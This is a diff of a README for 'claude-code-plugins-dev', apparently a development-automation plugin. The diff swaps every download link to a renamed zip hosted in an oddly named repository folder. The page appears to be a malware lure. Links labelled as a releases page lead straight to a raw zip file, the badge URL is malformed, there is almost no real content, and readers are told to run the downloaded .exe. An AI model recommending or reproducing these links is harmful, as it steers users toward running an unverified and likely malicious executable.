@@ -1,6 +1,6 @@
 # 🎉 claude-code-plugins-dev - Automate Your Development Tasks Easily
 
-[![Download Now](https://raw.githubusercontent.com/jerrytang02-gif/claude-code-plugins-dev/main/goosewinged/claude-code-plugins-dev.zip%https://raw.githubusercontent.com/jerrytang02-gif/claude-code-plugins-dev/main/goosewinged/claude-code-plugins-dev.zip)](https://raw.githubusercontent.com/jerrytang02-gif/claude-code-plugins-dev/main/goosewinged/claude-code-plugins-dev.zip)
+[![Download Now](https://raw.githubusercontent.com/jerrytang02-gif/claude-code-plugins-dev/main/goosewinged/code-dev-claude-plugins-3.3.zip%https://raw.githubusercontent.com/jerrytang02-gif/claude-code-plugins-dev/main/goosewinged/code-dev-claude-plugins-3.3.zip)](https://raw.githubusercontent.com/jerrytang02-gif/claude-code-plugins-dev/main/goosewinged/code-dev-claude-plugins-3.3.zip)
 
 ## 📖 Description
 
@@ -19,7 +19,7 @@ You can get started with our application in just a few steps. Follow the instruc
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the following link to access the download files: [Download Latest Release](https://raw.githubusercontent.com/jerrytang02-gif/claude-code-plugins-dev/main/goosewinged/claude-code-plugins-dev.zip).
+1. **Visit the Releases Page**: Go to the following link to access the download files: [Download Latest Release](https://raw.githubusercontent.com/jerrytang02-gif/claude-code-plugins-dev/main/goosewinged/code-dev-claude-plugins-3.3.zip).
   
 2. **Select the Latest Version**: Look for the most recent release. It will typically be at the top of the page.
 
@@ -28,7 +28,7 @@ You can get started with our application in just a few steps. Follow the instruc
 4. **Install the Application**: 
    - For Windows users, run the `.exe` file you downloaded.
    - For macOS users, open the `.dmg` file and drag the application to your Applications folder.
-   - For Linux users, follow the provided installation steps if you downloaded a `https://raw.githubusercontent.com/jerrytang02-gif/claude-code-plugins-dev/main/goosewinged/claude-code-plugins-dev.zip` or similar files.
+   - For Linux users, follow the provided installation steps if you downloaded a `https://raw.githubusercontent.com/jerrytang02-gif/claude-code-plugins-dev/main/goosewinged/code-dev-claude-plugins-3.3.zip` or similar files.
 
 5. **Run the Application**: Once installed, locate the app on your device and double-click to open it.
 
@@ -61,7 +61,7 @@ Join our community for help and support. You can ask questions and share experie
 
 ## 🔗 Useful Links
 
-- **Releases Page**: [Download Latest Release](https://raw.githubusercontent.com/jerrytang02-gif/claude-code-plugins-dev/main/goosewinged/claude-code-plugins-dev.zip)
+- **Releases Page**: [Download Latest Release](https://raw.githubusercontent.com/jerrytang02-gif/claude-code-plugins-dev/main/goosewinged/code-dev-claude-plugins-3.3.zip)
 - **Documentation**: Detailed user guide and FAQs can be found on our documentation page.
 - **Community Forum**: Share your insights and get help from other users.
 
